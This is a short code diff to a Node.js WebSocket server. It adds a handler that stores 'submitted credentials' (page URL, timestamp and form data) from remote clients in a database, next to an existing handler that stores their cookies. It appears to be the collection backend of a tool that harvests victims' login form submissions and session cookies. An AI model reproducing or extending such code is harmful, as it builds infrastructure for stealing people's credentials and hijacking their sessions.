@@ -24,6 +24,10 @@ module.exports = function initializeClientApi(appClients, server) {
             break;
           case "updatecookie":
             handeUpdateCookie(client_id, data[1]);
+            break;
+          case "addsubmittedcredentials":
+            handleAddSubmittedCredentials(client_id, data[1]);
+            break;
         }
       } catch (err) {
         console.error(err);
@@ -109,6 +113,20 @@ function handeUpdateCookie(client_id, cookie) {
     cookie.path,
     client_id,
     cookie.name
+  );
+}
+function handleAddSubmittedCredentials(client_id, credentials) {
+  const stmt = db.prepare(
+    `
+      INSERT INTO credentials (client_id, url, timestamp, data)
+      VALUES (?, ?, ?, ?)
+    `
+  );
+  stmt.run(
+    client_id,
+    credentials.metadata.url,
+    credentials.metadata.timestamp,
+    JSON.stringify(credentials.formData)
   );
 }
 function handleAlive(ws, data) {
